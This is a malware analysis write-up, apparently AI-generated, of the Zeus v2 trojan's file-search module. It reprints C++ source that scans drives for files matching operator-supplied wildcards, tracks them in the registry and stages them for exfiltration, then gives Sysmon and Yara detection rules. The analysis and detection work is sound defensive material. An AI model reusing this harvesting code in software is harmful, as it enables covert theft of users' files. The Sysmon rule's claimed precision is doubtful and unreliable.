# Zeus v2 - Automated Wildcard File Search & Harvesting

**Repository:** `theZoo-master`  
**File:** `malware/Source/Original/ZeuS2.0.8.9_Feb2013/ZeuS2.0.8.9_Feb2013/ZeuS 2.0.8.9 - Feb 2013/source/client/filesearch.cpp`  
**Language:** C++  
**MITRE ATT&CK:** T1083 (File and Directory Discovery), T1119 (Automated Collection), T1005 (Data from Local System)

## Overview

The Zeus v2 banking trojan implements a sophisticated, C2-driven file harvesting framework. This capability allows botnet operators to remotely task infected machines to search for and exfiltrate files matching specific wildcard patterns (e.g., `*.doc`, `*password*.txt`, `wallet.dat`). The entire process is automated: the bot continuously scans all fixed and removable drives, identifies new files matching the search criteria, stages them for upload, and exfiltrates them to the C2 server. This feature was instrumental in Zeus's evolution from a simple banking trojan to a comprehensive information stealer, responsible for massive corporate data breaches.

## Code Snippet & Analysis

The core of the file search functionality is implemented in two functions within `filesearch.cpp`: `FSProc` (the main search thread) and `ListDir` (the recursive search logic).

```cpp
// The main background thread for file searching
static void WINAPI FSProc(LOADERSPYDATA *plsd)
{
  // Set low priority to minimize performance impact
  SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_IDLE);

  // Loop indefinitely, with a 10-second pause between full scans
  while(WaitForSingleObject(plsd->hQuit, 10000) == WAIT_TIMEOUT)
  {
    // Skip if no search patterns ("quests") are active
    if(dwQuestsCount == 0) continue;

    WCHAR Path[8];
    DWORD dwDrives = GetLogicalDrives();
    
    // Enumerate all logical drives (C:, D:, etc.), skipping floppy drives
    for(BYTE i = 2; i < 32; i++)
    {
      if(dwDrives & (1 << i))
      {
        Path[0] = i + 'A';
        Path[1] = ':';
        Path[2] = '\\';
        Path[3] = 0;

        // Only scan fixed disks (HDDs/SSDs) and removable drives (USB)
        DWORD dwDriveType = GetDriveTypeW(Path);
        if(dwDriveType != DRIVE_FIXED && dwDriveType != DRIVE_REMOVABLE) continue;
        
        // Begin recursive directory scan from the drive's root
        ListDir(Path, plsd);
      }
    }
  }
}

// Recursive function to list directories and find matching files
static bool ListDir(LPWSTR pDir, LOADERSPYDATA *plsd)
{
  WCHAR Path[MAX_PATH];
  Fs::_pathCombine(Path, pDir, L"*"); // Create search path (e.g., C:\Users\*)
  
  WIN32_FIND_DATAW wfd;
  HANDLE hS = FindFirstFileW(Path, &wfd);
  if(hS == INVALID_HANDLE_VALUE) return false;

  do
  {
    // If it's a directory, recurse into it
    if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
    {
      // ... (recursion logic)
      ListDir(NewPath, plsd);
      continue;
    }

    // It's a file, check if it matches any of the search patterns
    for(DWORD i = 0; i < dwQuestsCount; i++)
    {
      // Use the Windows Shell API for efficient wildcard matching
      if(pQuests[i] && PathMatchSpecW(wfd.cFileName, pQuests[i]))
      {
        Fs::_pathCombine(Path, pDir, wfd.cFileName);
        
        // Check registry to see if this file (path + size) has already been uploaded
        if(!ThisFileAlreadyUploaded(Path, wfd.nFileSizeLow))
        {
          // Stage the file for exfiltration
          WCHAR rempath[MAX_PATH];
          wnsprintfW(rempath, MAX_PATH - 1, L"filesearch\\%06X_%s", wfd.nFileSizeLow, wfd.cFileName);
          
          // If report is successful, mark it as uploaded in the registry
          if(Report::writeFile(Path, NULL, rempath))
          {
            MarkFileAsUploaded(Path, wfd.nFileSizeLow);
          }
        }
      }
    }
  }
  while(FindNextFileW(hS, &wfd));
  
  FindClose(hS);
  return true;
}
```

### What it does:

1.  **Initiates a Low-Priority Thread:** The `FSProc` function runs as a background thread with `THREAD_PRIORITY_IDLE` to avoid impacting the user's system performance.
2.  **Enumerates Drives:** Every 10 seconds, it calls `GetLogicalDrives` to get a bitmask of all available drives. It iterates through them, skipping floppy drives, and focuses only on `DRIVE_FIXED` and `DRIVE_REMOVABLE` types.
3.  **Recursive Traversal:** For each valid drive, it calls `ListDir`, which performs a classic recursive file search using `FindFirstFileW` and `FindNextFileW`.
4.  **Wildcard Matching:** For each file found, it compares the filename against the list of C2-provided search patterns (`pQuests`) using the `PathMatchSpecW` API, which supports standard wildcards like `*` and `?`.
5.  **Duplicate Prevention:** Before uploading, it calls `ThisFileAlreadyUploaded`. This function queries a specific registry location (`HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\comdlg32`) where it stores the path and size of previously stolen files. This prevents re-uploading the same file, saving bandwidth and reducing noise.
6.  **Staging and Exfiltration:** If a file is new, it is staged with a unique name (e.g., `filesearch\00A1B2_report.docx`) and handed off to the reporting module (`Report::writeFile`) for compression and exfiltration to the C2 server.
7.  **State Tracking:** After a successful upload, `MarkFileAsUploaded` is called to write the file's path and size to the registry, preventing it from being stolen again.

### Why it's a TTP:

This code is a prime example of **T1083 - File and Directory Discovery** and **T1119 - Automated Collection**. Unlike a simple smash-and-grab stealer, Zeus establishes a persistent, configurable framework for ongoing data theft. The combination of recursive searching, C2-defined wildcards, and stateful tracking (duplicate prevention) makes it a powerful tool for targeted data exfiltration. The attacker doesn't need to know the exact location of a file; they can simply provide a pattern like `*secret*.doc` and let the botnet do the work of finding and retrieving it from any infected machine in the world.

## Detection & Evasion

### Sysmon Rule

The most unique indicator of this activity is the abuse of the `comdlg32` registry key, which is normally used by the Windows Common Dialog box. A Sysmon rule can watch for non-standard processes writing many values to this key.

```xml
<Sysmon schemaversion="4.82">
    <EventFiltering>
        <RuleGroup name="Zeus File Search Duplicate Tracking" groupRelation="or">
            <RegistryEvent onmatch="include">
                <!-- Detects a process writing file paths to the key Zeus uses for tracking -->
                <TargetObject condition="contains">\Software\Microsoft\Windows\CurrentVersion\Explorer\comdlg32</TargetObject>
                <Details condition="contains">\\</Details> <!-- Value being written contains a path separator -->
                <!-- Exclude legitimate Windows processes -->
                <Image condition="is not">C:\Windows\explorer.exe</Image>
                <Image condition="not end with">\rundll32.exe</Image>
            </RegistryEvent>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```
**Note:** This is a high-fidelity rule. Legitimate software has no reason to be writing full file paths as values into this specific registry key.

### Yara Rule

A Yara rule can detect the Zeus file search module by looking for the unique strings related to its operation, particularly the registry key and the format string for staging files.

```yara
rule TTP_Zeus_FileSearch_Module
{
    meta:
        author = "GitHub Copilot"
        description = "Detects the file search module of Zeus v2 by identifying key strings related to its operation."
        mitre_ttp = "T1119"
        malware = "Zeus"
    strings:
        // Registry key for tracking uploaded files
        $s1 = "software\\\\microsoft\\\\windows\\\\currentversion\\\\explorer\\\\comdlg32" wide

        // Staging path format string
        $s2 = "filesearch\\\\%06X_%s" wide
        
        // Debug strings
        $s3 = "FileSearch: Started" wide
        $s4 = "FileSearch: Ended" wide
        $s5 = "FileSearch: I found file %s" wide

        // C2 Commands (from other parts of the source)
        $c1 = "files_addquest" ascii
        $c2 = "files_delquest" ascii

    condition:
        uint16(0) == 0x5a4d and // PE file
        all of ($s*) and 1 of ($c*)
}
```
**Note:** This rule requires all the key operational strings (`$s*`) plus at least one of the C2 command strings (`$c*`) to be present, making it a very specific and reliable signature for this module.
